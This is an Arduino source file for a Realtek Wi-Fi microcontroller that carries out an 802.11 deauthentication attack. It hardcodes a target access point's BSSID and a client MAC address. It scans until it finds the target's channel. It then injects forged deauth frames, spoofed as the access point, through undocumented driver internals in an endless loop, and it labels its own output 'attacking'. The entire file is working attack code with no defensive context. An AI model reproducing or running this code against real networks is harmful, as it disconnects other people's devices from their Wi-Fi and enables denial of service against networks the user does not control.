#include <Arduino.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"

uint8_t TARGET_BSSID[6] = {0x7A, 0xA7, 0xB9, 0x84, 0xEB, 0x97};
uint8_t DST_MAC[6]      = {0xE6, 0x0E, 0x29, 0xD9, 0x95, 0x2E};

typedef struct {
  uint16_t frame_control = 0xC0;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

void sendDeauth() {
  DeauthFrame f;
  memcpy(&f.source, TARGET_BSSID, 6);
  memcpy(&f.access_point, TARGET_BSSID, 6);
  memcpy(&f.destination, DST_MAC, 6);
  f.reason = 2;
  uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
  uint8_t *fc = (uint8_t *)alloc_mgtxmitframe(ptr + 0xae0);
  if (fc != 0) {
    update_mgntframe_attrib(ptr, fc + 8);
    memset((void *)(*(uint32_t *)(fc + 0x80)), 0, 0x68);
    memcpy((uint8_t *)(*(uint32_t *)(fc + 0x80)) + 0x28, &f, sizeof(f));
    *(uint32_t *)(fc + 0x14) = sizeof(f);
    *(uint32_t *)(fc + 0x18) = sizeof(f);
    dump_mgntframe(ptr, fc);
  }
  delay(10);
}

int ch = -1;

unsigned long scanHandler(rtw_scan_handler_result_t* res) {
  if (res->scan_complete == 0 && memcmp(&res->ap_details.BSSID, TARGET_BSSID, 6) == 0)
    ch = res->ap_details.channel;
  return RTW_SUCCESS;
}

void setup() {
  Serial.begin(115200);
  wifi_on(RTW_MODE_STA);
  wifi_change_channel_plan(0x25);
  while (ch < 0) {
    wifi_scan_networks(scanHandler, NULL);
    for (int i = 0; i < 100 && ch < 0; i++) delay(100);
  }
  wext_set_channel("wlan0", (__u8)ch);
  Serial.print("[INFO] attacking ch ");
  Serial.println(ch);
}

void loop() {
  sendDeauth();
}
